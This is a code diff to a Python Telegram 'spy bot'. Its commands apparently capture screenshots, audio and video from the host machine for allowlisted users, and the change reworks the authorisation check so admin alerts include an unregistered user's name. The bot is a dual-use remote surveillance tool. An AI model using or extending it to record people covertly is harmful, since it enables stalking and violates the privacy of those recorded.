@@ -43,26 +43,26 @@ class Reminder:
 remind = Reminder()
 
 
-def isNotAuthorised(userID):
-    if userID not in ALLOWED_USERS:
-        bot.send_message(userID, "You are not authorized to use this bot")
-        bot.send_message(ADMIN,f'Incoming request from unregistered user {userID}')
+def isNotAuthorised(user):
+    if user.id not in ALLOWED_USERS:
+        bot.send_message(user.id, "You are not authorized to use this bot")
+        bot.send_message(ADMIN,f'Incoming request from unregistered user {user.first_name} {user.last_name} ({user.id})')
         return True
     return False
 
 
 @bot.message_handler(commands='start')
 def send_welcome(message):
-    user = message.from_user.id
+    user = message.from_user
     if isNotAuthorised(user):
         return
-    bot.send_message(user, "Welcome to the spy bot")
+    bot.send_message(user.id, "Welcome to the spy bot")
 
 
 @bot.message_handler(commands='photo')
 def send_screenshot(message):
     user = message.from_user.id
-    if isNotAuthorised(user):
+    if isNotAuthorised(message.from_user):
         return
 
     if videoRecorder.isRunning():
@@ -79,7 +79,7 @@ def send_screenshot(message):
 @bot.message_handler(commands='audio')
 def send_audio(message):
     user = message.from_user.id
-    if isNotAuthorised(user):
+    if isNotAuthorised(message.from_user):
         return
 
     if audioRecorder.isRunning():
@@ -101,7 +101,7 @@ def audioMarkup():
 @bot.message_handler(commands='videoonly')
 def send_video(message):
     user = message.from_user.id
-    if isNotAuthorised(user):
+    if isNotAuthorised(message.from_user):
         return
 
     if videoRecorder.isRunning():
@@ -123,7 +123,7 @@ def videoOnlyMarkup():
 @bot.message_handler(commands='video')
 def send_both(message):
     user = message.from_user.id
-    if isNotAuthorised(user):
+    if isNotAuthorised(message.from_user):
         return
 
     if videoRecorder.isRunning() or audioRecorder.isRunning():
